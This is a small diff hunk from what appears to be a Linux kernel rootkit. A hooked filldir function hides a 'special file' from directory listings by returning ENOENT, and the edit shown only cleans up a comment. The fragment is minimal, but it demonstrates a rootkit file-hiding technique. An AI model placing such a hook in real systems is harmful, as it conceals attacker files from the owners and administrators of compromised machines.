@@ -60,7 +60,7 @@ bool hooked_filldir(struct dir_context* dir_ctx, const char* name, int name_len,
 		#ifdef DEBUG
 		printk(KERN_ALERT "[DEBUG] FOUND SPECIAL FILE !\n");
 		#endif
-		return ENOENT;// This prevents the file from being seen?
+		return ENOENT; // This prevents the file from being seen
 	}
 
 	return original_root_filldir(dir_ctx, name, name_len, offset, ino, d_type);
